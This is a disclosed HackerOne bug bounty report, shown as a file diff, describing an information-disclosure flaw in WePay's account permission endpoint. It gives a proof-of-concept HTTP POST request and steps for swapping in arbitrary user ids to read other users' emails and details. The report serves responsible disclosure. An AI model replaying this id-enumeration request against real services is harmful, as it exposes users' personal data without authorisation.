@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/175040
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/cablej
+ReportedTo:WePay(wepay)
+BountyAmount:200.0
+Severity:medium
+State:Closed
+DateOfDisclosure:11.12.2016 17:12:29
+
+Summary:
+
+Hi,
+
+It is possible to access the emails and some other information of all users and potentially modify details of any user, resulting in a mass exposure of sensitive user information.
+
+This is as a result of the `https://www.wepay.com/account_ajax/member/161257089?form=change_permission` endpoint.
+
+POC:
+
+1. Intercept a request to change the permissions of a user (under the Access tab):
+
+```
+POST /account_ajax/member/[group_id]?form=change_permission HTTP/1.1
+Host: www.wepay.com
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us
+Content-Type: application/json;charset=UTF-8
+Origin: https://www.wepay.com
+Content-Length: 62
+Connection: close
+
+{"id":[any_id],"csrf":"[your_token]"}
+```
+
+2. Change `any_id` to any number representing a user id. 0, for example, returns a user that has no email, and any other number returns a user email. I haven't tested this much to not be invasive on the systems, but I believe this returns the email of every user of the system. This also may expose the photo of the user and any permissions.
+
+3. When making the request, the group ID returned of the new user looks to be changed to the current user's group. I am not entirely sure if this does update the group ID of the user, but this may present problems.
+
+Thanks, and please let me know if you would like any more information.
